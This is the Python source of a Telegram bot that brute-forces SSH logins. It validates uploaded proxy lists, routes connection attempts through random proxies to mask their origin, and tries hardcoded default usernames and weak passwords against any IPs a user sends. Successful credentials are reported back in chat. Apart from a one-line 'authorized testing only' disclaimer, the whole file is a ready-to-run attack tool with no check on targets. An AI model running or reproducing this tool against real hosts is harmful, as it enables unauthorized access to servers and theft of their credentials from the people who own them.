Telegram SSH Penetration Testing Bot
===================================
A Telegram bot for SSH security testing with manual proxy upload capability.
Allows users to upload proxy files and perform SSH brute force attacks.
WARNING: This tool is for authorized security testing only!
Use only on systems you own or have explicit permission to test.
"""
import asyncio
import json
import logging
import os
import random
import socket
import sys
import time
import threading
import re
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Union
from io import StringIO
import paramiko
from paramiko import AuthenticationException, SSHException
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Document
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
# Bot configuration
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
# Global configuration
CONFIG = {
    'timeout': 10,
    'auth_timeout': 5,
    'max_threads': 20,
    'max_attempts': 3,
    'delay_between_attempts': 1,
    'proxy_timeout': 5,
    'max_proxy_test_threads': 30
}
# Global storage for user data
user_data = {}
scan_locks = {}
# Emoji constants for better UX
EMOJIS = {
    'success': '✅',
    'error': '❌', 
    'warning': '⚠️',
    'info': 'ℹ️',
    'loading': '🔄',
    'proxy': '🌐',
    'ssh': '🔒',
    'upload': '📤',
    'scan': '🔍',
    'target': '🎯',
    'stats': '📊',
    'time': '⏱️'
}
class ProxyManager:
    """Manages proxy validation and usage"""
    
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def parse_proxy_file(self, file_content: str, file_format: str = 'auto') -> List[Dict]:
        """Parse proxy file content"""
        proxies = []
        lines = file_content.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            
            try:
                # Handle different formats
                if file_format == 'json' or (file_format == 'auto' and line.startswith('{')):
                    # JSON format
                    proxy_data = json.loads(line)
                    proxy = {
                        'ip': proxy_data.get('ip', ''),
                        'port': int(proxy_data.get('port', 0)),
                        'protocol': proxy_data.get('protocol', 'http'),
                        'username': proxy_data.get('username', ''),
                        'password': proxy_data.get('password', ''),
                        'source': 'uploaded'
                    }
                elif ':' in line:
                    # IP:PORT format or IP:PORT:USER:PASS
                    parts = line.split(':')
                    if len(parts) >= 2:
                        proxy = {
                            'ip': parts[0].strip(),
                            'port': int(parts[1].strip()),
                            'protocol': 'http',
                            'username': parts[2].strip() if len(parts) > 2 else '',
                            'password': parts[3].strip() if len(parts) > 3 else '',
                            'source': 'uploaded'
                        }
                    else:
                        continue
                else:
                    continue
                
                # Validate IP and port
                if self._is_valid_ip(proxy['ip']) and 1 <= proxy['port'] <= 65535:
                    proxies.append(proxy)
                    
            except (ValueError, json.JSONDecodeError) as e:
                continue
        
        return proxies
    
    def _is_valid_ip(self, ip: str) -> bool:
        """Validate IP address format"""
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
        except:
            return False
    
    def validate_proxy(self, proxy: Dict) -> bool:
        """Validate if a proxy is working"""
        try:
            proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
            if proxy['username'] and proxy['password']:
                proxy_url = f"http://{proxy['username']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
            
            proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            
            # Test with a simple HTTP request
            test_url = "http://httpbin.org/ip"
            response = requests.get(
                test_url,
                proxies=proxies,
                timeout=CONFIG['proxy_timeout'],
                verify=False
            )
            
            return response.status_code == 200
            
        except Exception:
            return False
    
    async def validate_proxies_batch(self, proxies: List[Dict], update: Update, context: ContextTypes.DEFAULT_TYPE) -> List[Dict]:
        """Validate proxies in parallel with progress updates"""
        working_proxies = []
        total = len(proxies)
        
        if total == 0:
            return working_proxies
        
        # Send initial progress message
        progress_msg = await update.message.reply_text(
            f"{EMOJIS['loading']} Validating {total} proxies...\nProgress: 0/{total} (0%)"
        )
        
        def validate_single(proxy):
            return self.validate_proxy(proxy), proxy
        
        with ThreadPoolExecutor(max_workers=CONFIG['max_proxy_test_threads']) as executor:
            # Submit validation tasks
            futures = [executor.submit(validate_single, proxy) for proxy in proxies]
            
            completed = 0
            for future in as_completed(futures):
                try:
                    is_working, proxy = future.result()
                    completed += 1
                    
                    if is_working:
                        working_proxies.append(proxy)
                    
                    # Update progress every 10 proxies or at completion
                    if completed % 10 == 0 or completed == total:
                        percentage = (completed / total) * 100
                        working_count = len(working_proxies)
                        
                        try:
                            await progress_msg.edit_text(
                                f"{EMOJIS['loading']} Validating proxies...\n"
                                f"Progress: {completed}/{total} ({percentage:.1f}%)\n"
                                f"Working proxies found: {working_count}"
                            )
                        except:
                            pass  # Ignore edit conflicts
                
                except Exception:
                    completed += 1
        
        # Final update
        try:
            await progress_msg.edit_text(
                f"{EMOJIS['success']} Proxy validation complete!\n"
                f"Working proxies: {len(working_proxies)}/{total} ({(len(working_proxies)/total)*100:.1f}%)"
            )
        except:
            pass
        
        self.working_proxies = working_proxies
        return working_proxies
    
    def get_random_proxy(self) -> Optional[Dict]:
        """Get a random working proxy"""
        if not self.working_proxies:
            return None
        return random.choice(self.working_proxies)
    
    def create_proxy_socket(self, target_host: str, target_port: int) -> Optional[socket.socket]:
        """Create a socket connection through a proxy"""
        proxy = self.get_random_proxy()
        if not proxy:
            return None
        
        try:
            # Create connection through HTTP proxy using CONNECT method
            proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_sock.settimeout(CONFIG['timeout'])
            proxy_sock.connect((proxy['ip'], proxy['port']))
            
            # Send CONNECT request
            connect_request = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n"
            proxy_sock.send(connect_request.encode())
            
            # Read response
            response = proxy_sock.recv(4096).decode()
            if "200 Connection established" in response or "200 OK" in response:
                return proxy_sock
            else:
                proxy_sock.close()
                return None
                
        except Exception:
            return None
class SSHScanner:
    """SSH port scanner and brute forcer"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
        self.scan_stats = {'attempted': 0, 'successful': 0, 'failed': 0}
        self.results = []
    
    def scan_ssh_port(self, host: str, port: int = 22, use_proxy: bool = True) -> bool:
        """Scan if SSH port is open"""
        try:
            if use_proxy and self.proxy_manager:
                sock = self.proxy_manager.create_proxy_socket(host, port)
                if sock:
                    sock.close()
                    return True
                else:
                    # Fallback to direct connection
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(CONFIG['timeout'])
                    result = sock.connect_ex((host, port))
                    sock.close()
                    return result == 0
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(CONFIG['timeout'])
                result = sock.connect_ex((host, port))
                sock.close()
                return result == 0
                
        except Exception:
            return False
    
    def attempt_ssh_login(self, host: str, port: int, username: str, password: str, use_proxy: bool = True) -> Optional[Dict]:
        """Attempt SSH login"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            sock = None
            if use_proxy and self.proxy_manager:
                sock = self.proxy_manager.create_proxy_socket(host, port)
            
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=CONFIG['auth_timeout'],
                allow_agent=False,
                look_for_keys=False,
                sock=sock
            )
            
            # Get server info
            transport = client.get_transport()
            server_version = transport.remote_version if transport else "Unknown"
            
            result = {
                'host': host,
                'port': port,
                'username': username,
                'password': password,
                'server_version': server_version,
                'timestamp': time.time(),
                'proxy_used': sock is not None
            }
            
            client.close()
            return result
            
        except AuthenticationException:
            return None
        except Exception:
            return None
    
    async def scan_target(self, host: str, port: int, usernames: List[str], passwords: List[str], 
                         update: Update, context: ContextTypes.DEFAULT_TYPE) -> List[Dict]:
        """Scan a single target with progress updates"""
        results = []
        
        # Check if SSH port is open
        status_msg = await update.message.reply_text(
            f"{EMOJIS['scan']} Checking SSH port on {host}:{port}..."
        )
        
        if not self.scan_ssh_port(host, port):
            await status_msg.edit_text(
                f"{EMOJIS['error']} SSH port {port} is closed on {host}"
            )
            return results
        
        await status_msg.edit_text(
            f"{EMOJIS['success']} SSH port {port} is open on {host}\n"
            f"{EMOJIS['loading']} Starting brute force attack..."
        )
# Try authentication
        total_attempts = len(usernames) * len(passwords)
        current_attempt = 0
        
        for username in usernames:
            for password in passwords:
                current_attempt += 1
                self.scan_stats['attempted'] += 1
                
                # Update progress every 10 attempts
                if current_attempt % 10 == 0:
                    percentage = (current_attempt / total_attempts) * 100
                    try:
                        await status_msg.edit_text(
                            f"{EMOJIS['success']} SSH port {port} is open on {host}\n"
                            f"{EMOJIS['loading']} Brute force progress: {current_attempt}/{total_attempts} ({percentage:.1f}%)\n"
                            f"Current: {username}:{password}\n"
                            f"Successful logins: {len(results)}"
                        )
                    except:
                        pass
                
                result = self.attempt_ssh_login(host, port, username, password)
                if result:
                    results.append(result)
                    self.results.append(result)
                    self.scan_stats['successful'] += 1
                    
                    # Immediately notify of success
                    await update.message.reply_text(
                        f"{EMOJIS['success']} LOGIN SUCCESSFUL!\n"
                        f"Host: {host}:{port}\n"
                        f"Credentials: {username}:{password}\n"
                        f"Server: {result['server_version']}"
                    )
                else:
                    self.scan_stats['failed'] += 1
                
                # Small delay between attempts
                await asyncio.sleep(CONFIG['delay_between_attempts'])
        
        # Final update
        await status_msg.edit_text(
            f"{EMOJIS['success']} Scan complete for {host}:{port}\n"
            f"Total attempts: {total_attempts}\n"
            f"Successful logins: {len(results)}"
        )
        
        return results
# Bot command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start command handler"""
    user_id = update.effective_user.id
    
    # Initialize user data
    if user_id not in user_data:
        user_data[user_id] = {
            'proxy_manager': ProxyManager(),
            'scanner': None,
            'scanning': False
        }
    
    keyboard = [
        [InlineKeyboardButton(f"{EMOJIS['upload']} Upload Proxies", callback_data="upload_proxies")],
        [InlineKeyboardButton(f"{EMOJIS['scan']} Start SSH Scan", callback_data="start_scan")],
        [InlineKeyboardButton(f"{EMOJIS['stats']} View Statistics", callback_data="view_stats")],
        [InlineKeyboardButton(f"{EMOJIS['info']} Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        f"{EMOJIS['ssh']} *SSH Penetration Testing Bot*\n\n"
        f"{EMOJIS['warning']} *WARNING:* This tool is for authorized security testing only!\n"
        f"Use only on systems you own or have explicit permission to test.\n\n"
        f"Please select an option:"
    )
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if user_id not in user_data:
        user_data[user_id] = {
            'proxy_manager': ProxyManager(),
            'scanner': None,
            'scanning': False
        }
    
    if data == "upload_proxies":
        await query.edit_message_text(
            f"{EMOJIS['upload']} Please upload a proxy file.\n\n"
            f"Supported formats:\n"
            f"• IP:PORT (one per line)\n"
            f"• IP:PORT:USERNAME:PASSWORD\n"
            f"• JSON format\n\n"
            f"Example:\n"
            f"```\n"
            f"192.168.1.1:8080\n"
            f"10.0.0.1:3128:user:pass\n"
            f"```",
            parse_mode='Markdown'
        )
        
    elif data == "start_scan":
        proxy_count = len(user_data[user_id]['proxy_manager'].working_proxies)
        if proxy_count == 0:
            await query.edit_message_text(
                f"{EMOJIS['error']} No working proxies available!\n"
                f"Please upload and validate proxies first."
            )
        else:
            await query.edit_message_text(
                f"{EMOJIS['target']} Ready to scan with {proxy_count} working proxies.\n\n"
                f"Please send target information in one of these formats:\n"
                f"• Single IP: `192.168.1.1`\n"
                f"• IP with custom port: `192.168.1.1:2222`\n"
                f"• Multiple IPs: `192.168.1.1,192.168.1.2,192.168.1.3`\n\n"
                f"Send /cancel to abort.",
                parse_mode='Markdown'
            )
            context.user_data['waiting_for_target'] = True
    
    elif data == "view_stats":
        proxy_manager = user_data[user_id]['proxy_manager']
        scanner = user_data[user_id]['scanner']
        
        proxy_count = len(proxy_manager.working_proxies)
        stats_text = f"{EMOJIS['stats']} *Current Statistics*\n\n"
        stats_text += f"{EMOJIS['proxy']} Working Proxies: {proxy_count}\n"
        
        if scanner:
            stats_text += f"{EMOJIS['scan']} SSH Attempts: {scanner.scan_stats['attempted']}\n"
            stats_text += f"{EMOJIS['success']} Successful Logins: {scanner.scan_stats['successful']}\n"
            stats_text += f"{EMOJIS['error']} Failed Attempts: {scanner.scan_stats['failed']}\n"
        
        await query.edit_message_text(stats_text, parse_mode='Markdown')
    
    elif data == "help":
        help_text = (
            f"{EMOJIS['info']} *Help & Instructions*\n\n"
            f"1. Upload proxy file using the Upload Proxies button\n"
            f"2. Wait for proxy validation to complete\n"
            f"3. Use Start SSH Scan to begin scanning\n"
            f"4. Enter target IP addresses when prompted\n"
            f"5. Monitor progress and results in real-time\n\n"
            f"*Proxy File Format:*\n"
            f"• One proxy per line\n"
            f"• Format: IP:PORT or IP:PORT:USER:PASS\n\n"
            f"*Commands:*\n"
            f"/start - Main menu\n"
            f"/cancel - Cancel current operation\n"
            f"/stats - Quick statistics"
        )
        await query.edit_message_text(help_text, parse_mode='Markdown')
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle uploaded proxy files"""
    user_id = update.effective_user.id
    
    if user_id not in user_data:
        user_data[user_id] = {
            'proxy_manager': ProxyManager(),
            'scanner': None,
            'scanning': False
        }
    
    document = update.message.document
    
    # Check file size (limit to 10MB)
    if document.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(
            f"{EMOJIS['error']} File too large! Maximum size is 10MB."
        )
        return
    
    # Download and process file
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content_str = file_content.decode('utf-8')
        
        # Parse proxies
        proxy_manager = user_data[user_id]['proxy_manager']
        proxies = proxy_manager.parse_proxy_file(content_str)
        
        if not proxies:
            await update.message.reply_text(
                f"{EMOJIS['error']} No valid proxies found in the uploaded file!\n"
                f"Please check the file format."
            )
            return
        
        await update.message.reply_text(
            f"{EMOJIS['success']} Found {len(proxies)} proxies in file.\n"
            f"{EMOJIS['loading']} Starting validation..."
        )
# Validate proxies
        working_proxies = await proxy_manager.validate_proxies_batch(proxies, update, context)
        
        if working_proxies:
            user_data[user_id]['scanner'] = SSHScanner(proxy_manager)
            await update.message.reply_text(
                f"{EMOJIS['success']} Proxy setup complete!\n"
                f"Working proxies: {len(working_proxies)}\n"
                f"Ready for SSH scanning."
            )
        else:
            await update.message.reply_text(
                f"{EMOJIS['error']} No working proxies found!\n"
                f"All {len(proxies)} proxies failed validation."
            )
    
    except Exception as e:
        await update.message.reply_text(
            f"{EMOJIS['error']} Error processing file: {str(e)}"
        )
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle text messages (targets)"""
    user_id = update.effective_user.id
    
    if user_id not in user_data:
        return
    
    # Check if waiting for target input
    if context.user_data.get('waiting_for_target'):
        context.user_data['waiting_for_target'] = False
        
        scanner = user_data[user_id]['scanner']
        if not scanner:
            await update.message.reply_text(
                f"{EMOJIS['error']} No scanner available! Please upload proxies first."
            )
            return
        
        # Parse targets
        targets_text = update.message.text.strip()
        targets = []
        
        for target in targets_text.split(','):
            target = target.strip()
            if ':' in target:
                host, port = target.split(':', 1)
                try:
                    port = int(port)
                    targets.append((host.strip(), port))
                except ValueError:
                    targets.append((target, 22))
            else:
                targets.append((target, 22))
        
        if not targets:
            await update.message.reply_text(
                f"{EMOJIS['error']} No valid targets found!"
            )
            return
        
        # Start scanning
        user_data[user_id]['scanning'] = True
        
        await update.message.reply_text(
            f"{EMOJIS['scan']} Starting SSH scan on {len(targets)} target(s)...\n"
            f"This may take a while. You'll receive updates as the scan progresses."
        )
        
        # Default credentials
        usernames = ['root', 'admin', 'user', 'test', 'ubuntu', 'pi']
        passwords = ['password', '123456', 'admin', 'root', '', 'test', '12345']
        
        total_results = []
        
        for i, (host, port) in enumerate(targets):
            await update.message.reply_text(
                f"{EMOJIS['target']} Scanning target {i+1}/{len(targets)}: {host}:{port}"
            )
            
            try:
                results = await scanner.scan_target(host, port, usernames, passwords, update, context)
                total_results.extend(results)
            except Exception as e:
                await update.message.reply_text(
                    f"{EMOJIS['error']} Error scanning {host}:{port}: {str(e)}"
                )
        
        # Final summary
        user_data[user_id]['scanning'] = False
        
        summary = (
            f"{EMOJIS['success']} *Scan Complete!*\n\n"
            f"{EMOJIS['target']} Targets scanned: {len(targets)}\n"
            f"{EMOJIS['scan']} Total attempts: {scanner.scan_stats['attempted']}\n"
            f"{EMOJIS['success']} Successful logins: {len(total_results)}\n"
            f"{EMOJIS['error']} Failed attempts: {scanner.scan_stats['failed']}"
        )
        
        if total_results:
            summary += f"\n\n{EMOJIS['success']} *Successful Logins:*\n"
            for result in total_results:
                summary += f"• {result['username']}:{result['password']}@{result['host']}:{result['port']}\n"
        
        await update.message.reply_text(summary, parse_mode='Markdown')
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Cancel current operation"""
    user_id = update.effective_user.id
    
    if user_id in user_data:
        user_data[user_id]['scanning'] = False
    
    context.user_data.clear()
    
    await update.message.reply_text(
        f"{EMOJIS['success']} Operation cancelled."
    )
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Quick stats command"""
    user_id = update.effective_user.id
    
    if user_id not in user_data:
        await update.message.reply_text(
            f"{EMOJIS['error']} No data available. Use /start to begin."
        )
        return
    
    proxy_manager = user_data[user_id]['proxy_manager']
    scanner = user_data[user_id]['scanner']
    
    proxy_count = len(proxy_manager.working_proxies)
    stats_text = f"{EMOJIS['stats']} *Quick Statistics*\n\n"
    stats_text += f"{EMOJIS['proxy']} Working Proxies: {proxy_count}\n"
    
    if scanner:
        stats_text += f"{EMOJIS['scan']} SSH Attempts: {scanner.scan_stats['attempted']}\n"
        stats_text += f"{EMOJIS['success']} Successful Logins: {scanner.scan_stats['successful']}\n"
        stats_text += f"{EMOJIS['error']} Failed Attempts: {scanner.scan_stats['failed']}\n"
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')
def main():
    """Main function to run the bot"""
    if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        print("Please set your TELEGRAM_BOT_TOKEN environment variable!")
        sys.exit(1)
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    # Start the bot
    print("Starting SSH Penetration Testing Bot...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBot stopped by user")
        sys.exit(0)
    except Exception as e:
        print(f"Unexpected error: {e}")
        sys.exit(1)
